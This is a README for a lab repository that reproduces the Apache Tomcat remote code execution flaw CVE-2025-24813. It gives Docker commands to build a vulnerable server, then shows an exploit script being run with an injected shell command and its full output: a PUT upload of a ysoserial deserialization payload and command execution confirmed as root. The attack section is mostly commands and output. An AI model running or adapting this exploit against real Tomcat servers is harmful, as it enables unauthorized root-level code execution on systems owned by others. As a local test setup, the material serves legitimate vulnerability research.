Tomcat CVE-2025-24813 playground
================================
Exploit was forked from https://github.com/absholi7ly/POC-CVE-2025-24813/blob/main/README.md (did not work for me)

Setup
=====
Build and run the vulnerable tomcat installation
```
$ docker build -t tomcat-cve-2025-24813 .
$ docker run --name tomcat-cve-2025-24813 -it -d -p 8081:8080 tomcat-cve-2025-24813
```

Exploit
=======
```
$ python CVE_2025_24813.py --command 'bash -c echo${IFS}$(id)>/tmp/PWN'  http://localhost:8080

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ███████╗      ██████╗ ██╗  ██╗ █████╗  ██╗██████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██╔════╝      ╚════██╗██║  ██║██╔══██╗███║╚════██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████╗█████╗ █████╔╝███████║╚█████╔╝╚██║ █████╔╝
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝██╔═══╝ ╚════██║██╔══██╗ ██║ ╚═══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗███████║      ███████╗     ██║╚█████╔╝ ██║██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚══════╝      ╚══════╝     ╚═╝ ╚════╝  ╚═╝╚═════╝
                          ---=== TOMCAT RCE PKLAYGROUND by u238 ===---

[*] Session ID: u238
[+] Server is writable via PUT: http://localhost:8080/check.txt
[*] Generating ysoserial payload for command: bash -c echo${IFS}$(id)>/tmp/PWN
[+] Payload generated successfully: payload.ser
[+] Payload uploaded with status 409 (Conflict): http://localhost:8080/u238.session
[+] Exploit succeeded! Server returned 500 after deserialization.
[+] Target http://localhost:8080 is vulnerable to CVE-2025-24813!
[+] Temporary file removed: payload.ser
```

Check (after exploit)
=====
```
$ podman exec tomcat-10.0.2-cve cat /tmp/PWN
uid=0(root) gid=0(root) groups=0(root)
```
